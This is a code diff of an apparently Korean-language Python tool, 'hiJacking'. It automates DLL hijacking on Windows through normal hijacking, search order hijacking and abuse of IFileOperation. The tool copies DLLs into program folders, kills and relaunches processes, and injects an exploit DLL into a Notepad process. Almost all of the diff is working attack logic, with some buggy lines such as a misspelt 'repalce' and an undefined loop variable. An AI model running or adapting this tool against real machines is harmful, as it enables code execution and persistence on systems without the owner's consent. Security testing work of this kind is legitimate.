@@ -121,7 +121,7 @@ class hiJacking():
         print('\n<안내 - 공격 방식을 선택해 주세요>')
         print('\n 1. Normal Hijacking')
         print('\n 2. Search Order Hijacking')
-        print('\n 3. Abusing IFileOperation (exe only)')
+        print('\n 3. Abusing IFileOperation')
         mode = input("Input Attack Mode : ")
         if str(mode) == "1":
             self.normal_hijack()
@@ -288,55 +288,64 @@ class hiJacking():
         if len(self.pid) == 0:
             for i in self.exe_in:
                 self.pid.append(self.create_process(i))
-        for i in tqdm(range(0,len(self.pid))):
-            pid = int(self.pid[i])
-            print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 Search Order hiJacking!')
-            program_name, list_dlls = self.list_dll(pid)
-            program_path = os.path.dirname(program_name)
-            changed_path = []
-            search_order_path = []
-            for j in list_dlls:
-                name_split = j.split('/')
-                name = name_split[-1]
-                search_order_path.append(program_path + "/" + name)
-                    
-            for j in range(len(list_dlls)):
-                try:
-                    shutil.copy2(list_dlls[j],search_order_path[j])
-                    changed_path.append(search_order_path[j])
-                except:
-                    print("\nERROR:: \"" + list_dlls[j] + "\" 를 복사 할 수 없습니다.")
-                    pass
-                    
-            psutil.Process(pid).kill()        
-            newPid = self.create_process(program_name)
-            program_name, newList_dlls = self.list_dll(newPid)
-
-            successed_path = {}
-
-            for j in newList_dlls:
-                if j in changed_path:
+        try:
+            for i in tqdm(range(0,len(self.pid))):
+                pid = int(self.pid[i])
+                print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 Search Order hiJacking!')
+                program_name, list_dlls = self.list_dll(pid)
+                program_path = os.path.dirname(program_name)
+                changed_path = []
+                search_order_path = []
+                for j in list_dlls:
                     name_split = j.split('/')
                     name = name_split[-1]
+                    search_order_path.append(program_path + "/" + name)
                         
-                    for k in list_dlls:
-                        name2_split = k.split('/')
-                        name2 = name2_split[-1]
-                        if name == name2:
-                            successed_path[j] = k
-
-            psutil.Process(newPid).kill()
-            time.sleep(0.5)        
-            for j in changed_path:
+                for j in range(len(list_dlls)):
                     try:
-                        os.remove(j)
+                        shutil.copy2(list_dlls[j],search_order_path[j])
+                        changed_path.append(search_order_path[j])
                     except:
-                        print("\nERROR::바꾼 파일을 삭제 할수가 없습니다. 직접 삭제해 주세요.")
-                
-            print(f'\n{str(pid)} 에서 Search Order Hijacking에 취약한 DLL 목록')
-            for key,value in successed_path.items():
-                print(f'\n 원본 DLL 경로 : {value} -> 공격에 성공 했을 시 DLL 경로 : {key}')
-            print("\n\n-------------------------\n")   
+                        print("\nERROR:: \"" + list_dlls[j] + "\" 를 복사 할 수 없습니다.")
+                        pass
+                        
+                psutil.Process(pid).kill()        
+                newPid = self.create_process(program_name)
+                program_name, newList_dlls = self.list_dll(newPid)
+
+                successed_path = {}
+
+                for j in newList_dlls:
+                    if j in changed_path:
+                        name_split = j.split('/')
+                        name = name_split[-1]
+                            
+                        for k in list_dlls:
+                            name2_split = k.split('/')
+                            name2 = name2_split[-1]
+                            if name == name2:
+                                successed_path[j] = k
+
+                psutil.Process(newPid).kill()
+                time.sleep(0.5)        
+                for j in changed_path:
+                        try:
+                            os.remove(j)
+                        except:
+                            print("\nERROR::바꾼 파일을 삭제 할수가 없습니다. 직접 삭제해 주세요.")
+                    
+                print(f'\n{str(pid)} 에서 Search Order Hijacking에 취약한 DLL 목록')
+                for key,value in successed_path.items():
+                    print(f'\n 원본 DLL 경로 : {value} -> 공격에 성공 했을 시 DLL 경로 : {key}')
+                print("\n\n-------------------------\n") 
+        except:
+            print("\nERROR::Not Found Search Order vulnerable dll")
+            ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
+            if ans == 'y':
+                self.__init__()
+            else: 
+                print("\n\n--End the program--\n")
+                return 
         print("\n\n--End the program--\n")
     # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
     # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
@@ -381,14 +390,17 @@ class hiJacking():
         
     
     def abusing_IfileOperation(self):
-        if len(self.exe_in) == 0:
-            print("\nERROR::Invalid Arguments")
-            ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
-            if ans == 'y':
-                self.__init__()
-            else: 
-                print("\n\n--End the program--\n")
         abspath = os.path.dirname(__file__)
+        try:
+                exe_pid = int(self.pid[i])
+                program_name, list_dlls = self.list_dll(exe_pid)
+        except:
+                print("\nERROR::Invalid PID")
+                ans = input('Do you want to try again? Back to the beginning DLL HiJacking\nYes = \'y\', No =\'q\'\ninput: ')
+                if ans == 'y':
+                    self.__init__()
+                else: 
+                    print("\n\n--End the program--\n")
         dll_abspath = self.U_dll()
         successed_list = []
         
@@ -408,8 +420,7 @@ class hiJacking():
         for i in range(0,len(self.pid)):
             print(f'{len(self.pid)}개의 pid 중 {i+1}번째 pid로의 Abusing IFileOperation!')
         # # DLL 리스트 파싱 후 원활한 파일 이동을 위해 프로세스 종료
-            exe_pid = int(self.pid[i])
-            program_name, list_dlls = self.list_dll(exe_pid)
+            
             
             psutil.Process(exe_pid).kill()
             dll_abspath = dll_abspath.replace("\\","\\\\")
@@ -501,6 +512,8 @@ class hiJacking():
                             else: 
                                 print("\n\n--End the program--\n")
                         psutil.Process(hijacked_pid).kill()
+                        time.sleep(0.5)
+                        
                         # shutil.copy2(dll_tmp_path,original_dll_path)
                         # os.remove(dll_tmp_path)
                         original_dll_path = original_dll_path.replace("/","\\\\")
@@ -530,8 +543,12 @@ class hiJacking():
                         try:
                             original_dll_path.repalce("\\\\","/")
                             dll_tmp_path.replace("\\\\","/")
+                           # os.remove(original_dll_path+"/"+dll_name)
                             inject(notePad_pid,exploit_dll_path)
                             print("Restore Injection Success!")
+                            dll_tmp_path = dll_tmp_path.replace("\\\\","/")
+                            
+                            os.remove(dll_tmp_path)
                             
                         except:
 
@@ -546,11 +563,11 @@ class hiJacking():
                             shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\CMakeFiles")
                             shutil.rmtree(abspath + "/"+"CreateIFileOperationDLL\Debug")
                             os.remove(abspath + "/"+"CreateIFileOperationDLL\dll.cpp")
-                            dll_tmp_path = dll_tmp_path.replace("\\\\","/")
-                            os.remove(dll_tmp_path)
+                            
                     print("\nAbusing IFileOperation을 통해 공격에 성공한 DLL 목록")
                     print(f'\n프로그램 이름 : {program_name}')
                     for j in successed_list:
                         print(f'\n{j}')
                         
-        print("\n\n--End the program--\n")    
+        print("\n\n--End the program--\n")
+        exit(0)
